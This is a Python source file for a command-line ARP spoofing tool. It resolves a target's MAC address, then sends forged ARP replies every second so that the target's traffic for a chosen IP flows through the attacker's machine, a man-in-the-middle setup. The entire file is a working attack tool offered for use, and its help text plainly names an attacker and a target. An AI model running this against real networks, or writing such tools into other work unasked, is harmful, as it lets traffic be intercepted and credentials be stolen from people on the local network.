import socket
import struct
import sys
import time
import argparse

FILE_ip_forward = "/proc/sys/net/ipv4/ip_forward"


def parse_args():
    parser = argparse.ArgumentParser(
        description="usage: ARPspoof.py -sourceIP [IPADDRESS] -sourceMAC [MACADDRESS] -dstIP [IPADDRESS] -dstMAC [MACADDRESS] -i eth0",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )

    parser.add_argument("-sourceIP", required=True, help="IP you want to spoof (web app, router, ...)")
    parser.add_argument("-sourceMAC", required=True, help="attacker MAC where to redirect trafic")
    parser.add_argument("-dstIP", required=True, help="IP address of destination (target)")
    parser.add_argument("-dstMAC", required=False, help="the MAC of targeted device that you want to Mitm (or ff:ff:ff:ff:ff:ff) (optional)")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to listen to (eth0, wlan0)")

    return parser.parse_args()


def mac_to_bytes(mac_str):
    return bytes.fromhex(mac_str.replace(":", ""))


def check_ip_forwarding():
    try:
        with open(FILE_ip_forward, 'r', encoding='utf-8') as f:
            if f.read().strip() == '1':
                print('[+] IP forwarding enabled')
                return True
    except Exception as e:
        print(f"[!] Error reading {FILE_ip_forward}: {e}")
        return False

    return False


def build_arp_frame(src_mac, src_ip, dst_mac, dst_ip):
    eth_header = dst_mac + src_mac + b'\x08\x06'

    arp_payload = struct.pack(
        "!HHBBH6s4s6s4s",
        1,
        0x0800,
        6,
        4,
        2,
        src_mac,
        socket.inet_aton(src_ip),
        dst_mac,
        socket.inet_aton(dst_ip)
    )

    return eth_header + arp_payload


def create_socket(interface):
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        s.bind((interface, 0))
        return s
    except PermissionError:
        print("[!] Root privileges required")
        sys.exit(1)
    except OSError as e:
        print(f"[!] Socket error on interface '{interface}': {e}")
        sys.exit(1)


def build_arp_request(src_mac, src_ip, target_ip):
    broadcast = b'\xff\xff\xff\xff\xff\xff'

    eth_header = broadcast + src_mac + b'\x08\x06'

    arp_payload = struct.pack(
        "!HHBBH6s4s6s4s",
        1,                  # Ethernet
        0x0800,             # IPv4
        6,
        4,
        1,                  # Opcode request
        src_mac,
        socket.inet_aton(src_ip),
        b'\x00\x00\x00\x00\x00\x00',
        socket.inet_aton(target_ip)
    )

    return eth_header + arp_payload

def arp_request(interface, src_mac, src_ip, target_ip, timeout=2):
    # Create raw socket
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
        s.bind((interface, 0))
    except PermissionError:
        print("[!] Root privileges required")
        return None

    # Broadcast MAC
    broadcast = b'\xff\xff\xff\xff\xff\xff'

    # Ethernet header
    eth_header = broadcast + src_mac + b'\x08\x06'

    # ARP request payload
    arp_payload = struct.pack(
        "!HHBBH6s4s6s4s",
        1,                      # Ethernet
        0x0800,                 # IPv4
        6,                      # MAC length
        4,                      # IP length
        1,                      # Opcode (request)
        src_mac,
        socket.inet_aton(src_ip),
        b'\x00\x00\x00\x00\x00\x00',
        socket.inet_aton(target_ip)
    )

    frame = eth_header + arp_payload

    # Send request
    s.send(frame)

    s.settimeout(timeout)

    try:
        while True:
            data, _ = s.recvfrom(65535)

            # Ethernet type = ARP
            eth_type = data[12:14]
            if eth_type != b'\x08\x06':
                continue

            # Extract ARP payload
            arp_packet = data[14:42]
            unpacked = struct.unpack("!HHBBH6s4s6s4s", arp_packet)

            opcode = unpacked[4]
            sender_mac = unpacked[5]
            sender_ip = socket.inet_ntoa(unpacked[6])

            # We only want ARP replies for our target IP
            if opcode == 2 and sender_ip == target_ip:
                s.close()
                return ':'.join(f'{b:02x}' for b in sender_mac)

    except socket.timeout:
        s.close()
        return None

def main():
    args = parse_args()

    if not check_ip_forwarding():
        print("[!] Warning: IP forwarding is disabled. You should run sudo sysctl -w net.ipv4.ip_forward=1")

    src_mac = mac_to_bytes(args.sourceMAC)
    interface = args.interface
    
    if not args.dstMAC:
        dstMAC = arp_request(interface=interface,src_mac=src_mac,src_ip=args.sourceIP,target_ip=args.dstIP)
        if not dstMAC:
            sys.exit(f"[!] Could not find the MAC address for {args.sourceIP}. Try specify it with -dstMAC.")
        dst_mac = mac_to_bytes(dstMAC)
        print(f"[+] Found target MAC address for {args.dstIP}:  {dstMAC}")
    else:
        dstMAC = args.dstMAC
        dst_mac = mac_to_bytes(dstMAC)
        
    
    sock = create_socket(interface)

    try: 
        while True:
            frame = build_arp_frame(
                src_mac,
                args.sourceIP,
                dst_mac,
                args.dstIP
            )
            sock.send(frame)
            print(f"[+] ARP frame sent to {args.dstIP}/{dstMAC} <-> {args.sourceIP} is at {args.sourceMAC}")
            time.sleep(1)

    except KeyboardInterrupt:
        print("\n[+] Stopped by user")
    finally:
        sock.close()


if __name__ == "__main__":
    main()
